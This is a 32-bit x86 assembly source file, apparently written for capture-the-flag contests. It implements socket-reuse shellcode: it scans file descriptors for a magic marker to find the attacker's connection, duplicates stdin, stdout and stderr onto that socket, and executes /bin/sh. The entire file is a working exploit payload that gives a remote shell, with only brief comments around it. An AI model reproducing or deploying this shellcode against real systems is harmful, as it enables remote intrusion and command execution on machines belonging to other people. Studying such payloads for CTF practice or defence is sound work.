	;; Evan Jensen 32bit socket reuse shellcode
	;; Paolo Soto
	;; Mon Mar  4 12:03:49 EST 2013
	;; EBX, ECX, EDX, ??? then stack - but we only need 3		
	;; read = 3, dup2 = 63, execve = 11
	%include "../include/short32.s"

	%define MAGIC dword 0xcafef00d
BITS 32
global main

	section .mytext progbits alloc exec write

main:
	mov ecx,esp 		; TODO is this too early?
	xor cx,cx 		; ecx=some valid stack address

	xor ebx,ebx
	mov bl,20		;adjust for the popularity of the ctf
	;; bl is the starting fd to read from, we try each in decending order
	xor edx,edx
	mov dl,4		;read 4 bytes
		
ourread:
	dec ebx 
	jnz ourread.next
	int 3			;debugging, do something else in prod
	;; this breakpoint should trigger if we DON'T find the magic number
.next:
	; sets up read
	xor eax,eax
	mov al, read 		;eax	
	int 0x80		;read eax=3
	cmp al,4  		;check to see if we've received our 4 bytes
	jnz ourread  		;if not, try with another file descriptor
	;;TODO: lets get rid of this cmp al,4 nonsense and save some bytes.
	cmp [ecx], MAGIC ;this is our magic number %defined on top
	jnz ourread      ; if we don't match try another file descriptor

	
	;; this dup2 code attaches stdin stdout and stderr to our socket
	;; so that we can talk to whatever program we run later
dup2: 	
	xor ecx,ecx 
	mov cl, 2
.copy:
	xor eax,eax 	; because we need to nuke the retval of dup2
	mov al,dup2	;dup2
	int 0x80
	dec ecx    	; this is for looping stderr/out/in
	jns dup2.copy

	;; OUR SOCKET IS IN EBX
	
	;; now just some local shellcode
	;; execve("/bin/sh", NULL, NULL) 
	xor eax,eax 		; set up null byte
	push eax  		; push null byte to terminate /bin/sh 
	push 0x68732f2f         ; /bin//sh is too wide for register
	push 0x6e69622f 	; use 2 pushes to the stack
	mov al,execve 		;execve in /usr/include/asm/unistd_32.h
	mov ebx,esp 		;arg1 = "/bin/sh\0" 
	xor ecx,ecx 		;arg2 = \0
	xor edx,edx 		;arg3 = \0
	int 0x80
